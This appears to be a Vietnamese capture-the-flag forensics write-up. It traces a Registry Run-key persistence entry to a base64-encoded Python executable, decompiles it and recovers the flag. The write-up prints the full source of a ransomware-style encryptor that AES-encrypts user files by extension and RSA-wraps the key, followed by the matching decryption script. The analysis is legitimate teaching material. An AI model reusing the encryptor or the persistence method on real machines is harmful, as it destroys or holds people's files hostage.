### 1. Description

"I'm RUN, i'm alive, you can't find me. I'm the king of hidden"

[Link](https://bit.ly/40AW5OG)

### 2. Solution

Bài cung cấp 1 file AD1. Mở nó bằng công cụ FTK Imager, chuyên dụng cho loại file này. Bài này mình đã cho hẳn 1 part của flag nằm ở file 1.txt ở trong thư mục Downloads. 

![image](https://github.com/user-attachments/assets/eb894a1f-b687-4e1a-94c0-bb66f17a8098)

Thường thì dạng bài này sẽ là về mã độc và các kĩ thuật liên quan. Trong thư mục Desktop, ta thấy được 1 số file đáng nghi như sau: 

![image](https://github.com/user-attachments/assets/003172d8-e0be-47d9-b6f4-ead56fb85b23)

Các file encrypted_aes_key.bin, iv.bin và keypair.key có vẻ dùng cho mục đích nào đó. Ta kiểm tra các file khác và thấy chúng không đọc được. Từ đây ta suy ra được chúng đã bị mã hóa và ta cần tìm ra mã độc để giải mã. Từ đề bài, ta có thể đoán được kĩ thuật được sử dụng ở đây là Persistence - duy trì sự tồn tại của mã độc trên hệ thống (trước khi có hint, còn sau khi có hint thì nó quá rõ ràng rồi). Mình đã loại bỏ hầu hết các file không liên quan và chỉ để lại 1 số folder quan trọng, trong đó có config nằm ở folder System32. Thư mục này lưu trữ các Registry của hệ thống và hệ thống cấu hình. Đến đây, ta đoán được 90% phương pháp sử dụng ở đây là Registry keys. Với phương pháp này, có 1 số đường dẫn mà ta cần lưu ý như sau: 
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce 
```
Khi được nạp vào Run, mã độc sẽ được tự động chạy khi hệ thống được khởi động. Export file SOFTWARE trong config ra. Tiếp theo, sử dụng công cụ có thể tương tác với các file như này, ở đây các bạn có thể chọn Registry Spy hoặc Registry Explorer. Load file vào tool, ta tập trung vào đường dẫn mà mình đã nói ở trên. Ở Run, ta thấy 1 đoạn mã lạ: 

![image](https://github.com/user-attachments/assets/e060cda7-ce6c-4aa4-9efc-eb3988c3337b)

Copy all và đưa vào Cyberchef để giải mã base64, ta được 1 file exe: 

![image](https://github.com/user-attachments/assets/9ecd9e94-8e83-43ff-a4b5-129417daf331)

Nếu sử dụng DIE, ta sẽ chỉ thấy nó được viết bằng C/C++. Tuy nhiên khi load vào IDA, ta thấy rằng nó thực sự được viết bằng Python, sau đó compile ra exe. 

![image](https://github.com/user-attachments/assets/ec1ac56d-e50f-4c9b-811f-e8ef12f42f43)

Dùng pyinstxtractor để decompile nó thành file pyc, kết quả ta nhận được: 

![image](https://github.com/user-attachments/assets/f043b00d-5ce9-4b0a-ba97-acdbf786448e)

Có khá nhiều file, tuy nhiên đa phần là các thư viện và module của nó. Ta tập trung vào file encode.py hoặc nó tên gì phụ thuộc vào tên bạn đặt khi export từ Cyberchef. Load file này vào [PyLingual](https://www.pylingual.io), ta có được đoạn code mã hóa ban đầu: 

```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: encode.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import random
import string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
BLOCK_SIZE = 16

def rsa_generatePublicPrivate():
    key = RSA.generate(2048)
    public_key = key.publickey().export_key('PEM')
    private_key = key.export_key('PEM')
    with open('keyPair.key', 'wb') as f:
        f.write(public_key)
        f.write(b'@')
        f.write(private_key)
    print("RSA key pair generated and saved to 'keyPair.key'.")

def generate_key():
    aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return aes_key

def aes_encrypt(aes_key, iv, file_path):
    key = aes_key.encode('utf-8')
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    padding_length = BLOCK_SIZE - len(plaintext) % BLOCK_SIZE
    plaintext += bytes([padding_length]) * padding_length
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    with open(file_path, 'wb') as f:
        f.write(ciphertext)

def encrypt_files_with_extensions(aes_key, iv, extensions):
    current_directory = os.getcwd()
    for root, dirs, files in os.walk(current_directory):
        for file in files:
            if not any((file.endswith(ext) for ext in extensions)):
                continue
            aes_encrypt(aes_key, iv, os.path.join(root, file))
    print(f"All files with extensions {', '.join(extensions)} have been encrypted.")

def rsa_encrypt(aes_key, public_key):
    public_key_obj = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(public_key_obj)
    encrypted_key = cipher_rsa.encrypt(aes_key.encode('utf-8'))
    with open('encrypted_aes_key.bin', 'wb') as f:
        f.write(encrypted_key)
    print("AES key has been encrypted and saved to 'encrypted_aes_key.bin'.")
if __name__ == '__main__':
    rsa_generatePublicPrivate()
    with open('keyPair.key', 'rb') as f:
        keys = f.read()
    public_key, private_key = keys.split(b'@')
    aes_key = generate_key()
    iv = os.urandom(BLOCK_SIZE)
    with open('iv.bin', 'wb') as f:
        f.write(iv)
    extensions_to_encrypt = ['.txt', '.png', '.jpeg', '.jpg', '.docm', '.docx', '.xlsx']
    encrypt_files_with_extensions(aes_key, iv, extensions_to_encrypt)
    rsa_encrypt(aes_key, public_key)
    print("\n        | | _____ _____   _| |__   ___  __ _ _ __\n        | |/ / _ \\_  / | | | '_ \\ / _ \\/ _` | '__|\n        |   < (_) / /| |_| | |_) |  __/ (_| | |\n        |_|\\_\\___/  . All specified files have been encrypted.\n    ")
```

Đoạn code này sử dụng 2 lớp mã hóa. Ban đầu nó mã hóa các file bằng AES. IV được lưu vào 1 file riêng. Còn key sau đó được mã hóa bằng RSA và lưu vào tệp encrypted_aes_key.bin. Cặp khóa mã hóa RSA sẽ được lưu trong tệp keyPair và được ngăn cách bởi kí tự @. Giờ việc còn lại chỉ là giải mã với các thông tin đã có:

```python
import os
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

BLOCK_SIZE = 16

def rsa_decrypt(private_key_path, encrypted_key_path):
    with open(private_key_path, 'rb') as f:
        keys = f.read()
    _, private_key = keys.split(b'@')

    private_key_obj = RSA.import_key(private_key)

    with open(encrypted_key_path, 'rb') as f:
        encrypted_key = f.read()

    cipher_rsa = PKCS1_OAEP.new(private_key_obj)
    decrypted_key = cipher_rsa.decrypt(encrypted_key)
    return decrypted_key.decode("utf-8")

def aes_decrypt(aes_key, iv_path, file_path):

    with open(iv_path, 'rb') as f:
        iv = f.read()

    key = aes_key.encode("utf-8")

    with open(file_path, 'rb') as f:
        ciphertext = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)

    padding_length = plaintext[-1]
    plaintext = plaintext[:-padding_length]

    with open(file_path, 'wb') as f:
        f.write(plaintext)

def decrypt_files_with_extensions(aes_key, iv_path, extensions):
    current_directory = os.getcwd()
    for root, dirs, files in os.walk(current_directory):
        for file in files:
            if any(file.endswith(ext) for ext in extensions):
                aes_decrypt(aes_key, iv_path, os.path.join(root, file))
    print(f"All files with extensions {', '.join(extensions)} have been decrypted.")


if __name__ == "__main__":

    key_pair_path = 'keyPair.key'

    encrypted_key_path = 'encrypted_aes_key.bin'

    iv_path = 'iv.bin'

    aes_key = rsa_decrypt(key_pair_path, encrypted_key_path)

    extensions_to_decrypt = ['.txt', '.png', '.jpeg', '.jpg', '.docm','.docx','.xlsx']
    decrypt_files_with_extensions(aes_key, iv_path, extensions_to_decrypt)
```

Ở file nothing.png sau giải mã, ta tìm được part2 của flag: 

![nothing](https://github.com/user-attachments/assets/9aa54ac0-070a-4db2-bd2c-6b7c83f8bbc9)

FLAG : **TASCTF{Surpr1se_N0t_4_R34LLY_M4lwa3r_P3rs1st3nc3!!!!}**
